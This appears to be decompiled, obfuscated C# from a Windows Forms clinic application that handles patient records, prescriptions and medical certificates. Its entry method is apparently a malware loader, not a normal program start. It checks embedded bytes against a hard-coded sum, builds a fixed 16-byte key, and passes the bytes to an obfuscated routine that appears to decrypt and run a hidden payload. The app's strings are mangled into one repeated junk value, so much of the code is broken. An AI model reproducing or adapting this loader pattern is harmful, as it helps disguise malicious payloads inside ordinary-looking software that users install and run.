		NewLateBinding.LateCall(BunifuTransitionPRESCRIPTION, (Type)null, "HideSync", array = new object[1] { D_PRESCRIPTION1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_PRESCRIPTION1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionDMEDHISTORY, (Type)null, "HideSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPNLPRESCRIPTION, (Type)null, "HideSync", array = new object[1] { PNLPRESCRIPTION }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLPRESCRIPTION = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionhome, (Type)null, "ShowSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
	}

	private void Wm2(object sender, EventArgs e)
	{
		e1A();
		NewLateBinding.LateCall(RPTPRESCRIPTION, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void e1A()
	{
		throw new NotImplementedException();
	}

	private void Qd1(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(PNLMEDICALCERT, (Type)null, "Visible", new object[0], (string[])null, (Type[])null, (bool[])null), (object)false, false))
		{
			object bunifuTransitionPATIENTINFO = BunifuTransitionPATIENTINFO;
			object[] obj = new object[1] { PNLPATIENTINFO };
			object[] array = obj;
			bool[] obj2 = new bool[1] { true };
			bool[] array2 = obj2;
			NewLateBinding.LateCall(bunifuTransitionPATIENTINFO, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
			if (array2[0])
			{
				PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
			NewLateBinding.LateCall(BunifuTransitionSETTINGS, (Type)null, "HideSync", array = new object[1] { PNLLOGOUT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
			if (array2[0])
			{
				PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
			NewLateBinding.LateCall(PNLMEDICALCERT, (Type)null, "BringToFront", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(BunifuTransitionSTAFFREQUEST, (Type)null, "ShowSync", array = new object[1] { PNLMEDICALCERT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
			if (array2[0])
			{
				PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
		}
		else if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(PNLMEDICALCERT, (Type)null, "Visible", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))
		{
			object bunifuTransitionPATIENTINFO2 = BunifuTransitionPATIENTINFO;
			object[] obj3 = new object[1] { PNLPATIENTINFO };
			object[] array = obj3;
			bool[] obj4 = new bool[1] { true };
			bool[] array2 = obj4;
			NewLateBinding.LateCall(bunifuTransitionPATIENTINFO2, (Type)null, "HideSync", obj3, (string[])null, (Type[])null, obj4, true);
			if (array2[0])
			{
				PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
			NewLateBinding.LateCall(BunifuTransitionSTAFFREQUEST, (Type)null, "HideSync", array = new object[1] { PNLMEDICALCERT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
			if (array2[0])
			{
				PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
		}
	}

	private void Qp5(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(PNLPRESCRIPTION, (Type)null, "Visible", new object[0], (string[])null, (Type[])null, (bool[])null), (object)false, false))
		{
			object bunifuTransitionSETTINGS = BunifuTransitionSETTINGS;
			object[] obj = new object[1] { PNLLOGOUT };
			object[] array = obj;
			bool[] obj2 = new bool[1] { true };
			bool[] array2 = obj2;
			NewLateBinding.LateCall(bunifuTransitionSETTINGS, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
			if (array2[0])
			{
				PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
			NewLateBinding.LateCall(PNLPRESCRIPTION, (Type)null, "BringToFront", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(BunifuTransitionPNLPRESCRIPTION, (Type)null, "ShowSync", array = new object[1] { PNLPRESCRIPTION }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
			if (array2[0])
			{
				PNLPRESCRIPTION = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
		}
		else if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(PNLPRESCRIPTION, (Type)null, "Visible", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))
		{
			object bunifuTransitionPNLPRESCRIPTION = BunifuTransitionPNLPRESCRIPTION;
			object[] obj3 = new object[1] { PNLPRESCRIPTION };
			object[] array = obj3;
			bool[] obj4 = new bool[1] { true };
			bool[] array2 = obj4;
			NewLateBinding.LateCall(bunifuTransitionPNLPRESCRIPTION, (Type)null, "HideSync", obj3, (string[])null, (Type[])null, obj4, true);
			if (array2[0])
			{
				PNLPRESCRIPTION = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
		}
	}

	private void Nz7(object sender, EventArgs e)
	{
		object bunifuTransitionSTAFFREQUEST = BunifuTransitionSTAFFREQUEST;
		object[] obj = new object[1] { PNLMEDICALCERT };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(bunifuTransitionSTAFFREQUEST, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[0])
		{
			PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPATIENTINFO, (Type)null, "HideSync", array = new object[1] { PNLPATIENTINFO }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionEDITPATIENT, (Type)null, "HideSync", array = new object[1] { S_EDITPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_EDITPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionhome, (Type)null, "HideSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "HideSync", array = new object[1] { S_MEDICALRECORD1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALRECORD1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "HideSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_ADDPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_ADDPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "ShowSync", array = new object[1] { S_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
	}

	private void Af2(object sender, EventArgs e)
	{
		object bunifuTransitionPNLPRESCRIPTION = BunifuTransitionPNLPRESCRIPTION;
		object[] obj = new object[1] { PNLPRESCRIPTION };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(bunifuTransitionPNLPRESCRIPTION, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[0])
		{
			PNLPRESCRIPTION = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionSETTINGS, (Type)null, "HideSync", array = new object[1] { PNLLOGOUT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionhome, (Type)null, "HideSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { D_TREATMENTDETAILS1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_TREATMENTDETAILS1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPRESCRIPTION, (Type)null, "HideSync", array = new object[1] { D_PRESCRIPTION1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_PRESCRIPTION1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionDMEDCERT, (Type)null, "HideSync", array = new object[1] { D_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionDMEDHISTORY, (Type)null, "ShowSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
	}

	private void a3J(object sender, EventArgs e)
	{
		object bunifuTransitionPNLPRESCRIPTION = BunifuTransitionPNLPRESCRIPTION;
		object[] obj = new object[1] { PNLPRESCRIPTION };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(bunifuTransitionPNLPRESCRIPTION, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[0])
		{
			PNLPRESCRIPTION = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { D_TREATMENTDETAILS1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_TREATMENTDETAILS1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionDMEDHISTORY, (Type)null, "HideSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionhome, (Type)null, "HideSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionDMEDCERT, (Type)null, "HideSync", array = new object[1] { D_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPRESCRIPTION, (Type)null, "ShowSync", array = new object[1] { D_PRESCRIPTION1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_PRESCRIPTION1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
	}

	private void Ts2(object sender, EventArgs e)
	{
		object bunifuTransitionPNLPRESCRIPTION = BunifuTransitionPNLPRESCRIPTION;
		object[] obj = new object[1] { PNLPRESCRIPTION };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(bunifuTransitionPNLPRESCRIPTION, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[0])
		{
			PNLPRESCRIPTION = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { D_TREATMENTDETAILS1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_TREATMENTDETAILS1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionDMEDHISTORY, (Type)null, "HideSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionhome, (Type)null, "HideSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPRESCRIPTION, (Type)null, "HideSync", array = new object[1] { D_PRESCRIPTION1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_PRESCRIPTION1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionDMEDCERT, (Type)null, "ShowSync", array = new object[1] { D_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
	}

	private void c5B(object sender, EventArgs e)
	{
		NewLateBinding.LateSet(lbldate, (Type)null, "Text", new object[1] { DateTime.Now.ToString("dddd,  dd MMM yyyy  hh:mm:ss tt") }, (string[])null, (Type[])null);
	}

	private void Ns6(object sender, EventArgs e)
	{
		NewLateBinding.LateCall(Timer1, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		Fp7();
	}

	public void Fp7()
	{
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (CONN.get_State() == ConnectionState.Open)
			{
				CONN.Close();
			}
			string text = "PceOHCARIEENTINFORMATIONaddpatientccdb";
			CONN.Open();
			OleDbCommand val = new OleDbCommand(text, CONN);
			OleDbDataReader val2 = val.ExecuteReader(CommandBehavior.CloseConnection);
			if (val2.Read())
			{
				PATIENTID = Conversions.ToInteger(Operators.AddObject(val2.get_Item(0), (object)1)).ToString("PceOHCARIEENTINFORMATIONaddpatientccdb");
			}
			else if (Information.IsDBNull((object)val2))
			{
				PATIENTID = "PceOHCARIEENTINFORMATIONaddpatientccdb";
			}
			else
			{
				PATIENTID = "PceOHCARIEENTINFORMATIONaddpatientccdb";
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)Conversions.ToInteger("PceOHCARIEENTINFORMATIONaddpatientccdb()"), (object)null);
			ProjectData.ClearProjectError();
		}
		finally
		{
			CONN.Close();
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(S_ADDPATIENTINFO1, (Type)null, "TXTPATIENTID1", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[1] { PATIENTID }, (string[])null, (Type[])null, false, true);
		}
	}

	private void q2M(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(PNLLOGOUT, (Type)null, "Visible", new object[0], (string[])null, (Type[])null, (bool[])null), (object)false, false))
		{
			object bunifuTransitionPNLPRESCRIPTION = BunifuTransitionPNLPRESCRIPTION;
			object[] obj = new object[1] { PNLPRESCRIPTION };
			object[] array = obj;
			bool[] obj2 = new bool[1] { true };
			bool[] array2 = obj2;
			NewLateBinding.LateCall(bunifuTransitionPNLPRESCRIPTION, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
			if (array2[0])
			{
				PNLPRESCRIPTION = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
			NewLateBinding.LateCall(PNLLOGOUT, (Type)null, "BringToFront", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(BunifuTransitionSETTINGS, (Type)null, "ShowSync", array = new object[1] { PNLLOGOUT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
			if (array2[0])
			{
				PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
		}
		else if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(PNLLOGOUT, (Type)null, "Visible", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))
		{
			object bunifuTransitionSETTINGS = BunifuTransitionSETTINGS;
			object[] obj3 = new object[1] { PNLLOGOUT };
			object[] array = obj3;
			bool[] obj4 = new bool[1] { true };
			bool[] array2 = obj4;
			NewLateBinding.LateCall(bunifuTransitionSETTINGS, (Type)null, "HideSync", obj3, (string[])null, (Type[])null, obj4, true);
			if (array2[0])
			{
				PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
		}
	}

	private void y6E(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(PNLLOGOUT, (Type)null, "Visible", new object[0], (string[])null, (Type[])null, (bool[])null), (object)false, false))
		{
			object bunifuTransitionSTAFFREQUEST = BunifuTransitionSTAFFREQUEST;
			object[] obj = new object[1] { PNLMEDICALCERT };
			object[] array = obj;
			bool[] obj2 = new bool[1] { true };
			bool[] array2 = obj2;
			NewLateBinding.LateCall(bunifuTransitionSTAFFREQUEST, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
			if (array2[0])
			{
				PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
			NewLateBinding.LateCall(BunifuTransitionPATIENTINFO, (Type)null, "HideSync", array = new object[1] { PNLPATIENTINFO }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
			if (array2[0])
			{
				PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
			NewLateBinding.LateCall(PNLLOGOUT, (Type)null, "BringToFront", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(BunifuTransitionSETTINGS, (Type)null, "ShowSync", array = new object[1] { PNLLOGOUT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
			if (array2[0])
			{
				PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
		}
		else if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(PNLLOGOUT, (Type)null, "Visible", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))
		{
			object bunifuTransitionSETTINGS = BunifuTransitionSETTINGS;
			object[] obj3 = new object[1] { PNLLOGOUT };
			object[] array = obj3;
			bool[] obj4 = new bool[1] { true };
			bool[] array2 = obj4;
			NewLateBinding.LateCall(bunifuTransitionSETTINGS, (Type)null, "HideSync", obj3, (string[])null, (Type[])null, obj4, true);
			if (array2[0])
			{
				PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
		}
	}

	private void Ws7(object sender, EventArgs e)
	{
		object bunifuTransitionSETTINGS = BunifuTransitionSETTINGS;
		object[] obj = new object[1] { PNLLOGOUT };
		object[] array = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(bunifuTransitionSETTINGS, (Type)null, "HideSync", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[0])
		{
			PNLLOGOUT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionSTAFFREQUEST, (Type)null, "HideSync", array = new object[1] { PNLMEDICALCERT }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLMEDICALCERT = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPATIENTINFO, (Type)null, "HideSync", array = new object[1] { PNLPATIENTINFO }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLPATIENTINFO = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_ADDPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_ADDPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionEDITPATIENT, (Type)null, "HideSync", array = new object[1] { S_EDITPATIENTINFO1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_EDITPATIENTINFO1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "HideSync", array = new object[1] { S_MEDICALRECORD1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALRECORD1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionMEDRECORD, (Type)null, "HideSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { S_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionDMEDCERT, (Type)null, "HideSync", array = new object[1] { D_MEDICALCERTIFICATE1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_MEDICALCERTIFICATE1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionADDPATIENT, (Type)null, "HideSync", array = new object[1] { D_TREATMENTDETAILS1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_TREATMENTDETAILS1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPRESCRIPTION, (Type)null, "HideSync", array = new object[1] { D_PRESCRIPTION1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			D_PRESCRIPTION1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionDMEDHISTORY, (Type)null, "HideSync", array = new object[1] { S_MEDICALHISTORY1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_MEDICALHISTORY1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionPNLPRESCRIPTION, (Type)null, "HideSync", array = new object[1] { PNLPRESCRIPTION }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			PNLPRESCRIPTION = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransitionhome, (Type)null, "HideSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateSetComplex(PNLSTAFFMENU, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(PNLDOCTORMENU, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Login1, (Type)null, "PNLLOGASDOCTOR", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Login1, (Type)null, "PNLLOGASSTAFF", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(BunifuTransition1, (Type)null, "HideSync", array = new object[1] { S_HOME1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			S_HOME1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
		NewLateBinding.LateCall(BunifuTransition1, (Type)null, "ShowSync", array = new object[1] { Login1 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			Login1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
		}
	}

	[STAThread]
	public static void d8T()
	{
		checked
		{
			try
			{
				int num = (int)Math.Round(Math.Floor(99.87450980392157) + 90.0);
				int num2 = (int)Math.Round(Math.Floor(99.87450980392157) + 70.0);
				int num3 = (int)Math.Round(Math.Floor(99.87450980392157) - 1.0);
				int num4 = (int)Math.Round(Math.Floor(99.87450980392157) + 142.0);
				int num5 = num + num2 + num3 + num4;
				if (num5 != Math.Abs(697))
				{
					return;
				}
				int num6 = unchecked((int)Nx2.Qm3()[0]) + unchecked((int)Nx2.Qm3()[1]) + unchecked((int)Nx2.Qm3()[2]) + unchecked((int)Nx2.Qm3()[3]);
				if (num5 != num6)
				{
					Environment.Exit(Environment.ExitCode);
					return;
				}
				s0S5L.Zg5w8();
				List<byte> list = new List<byte>();
				int num7 = 251;
				while (list.Count != 16)
				{
					list.Add((byte)num7);
				}
				RuntimeHelpers.GetObjectValue(f3S5Z.Ko98Zq(Nx2.Qm3(), list.ToArray(), num7));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
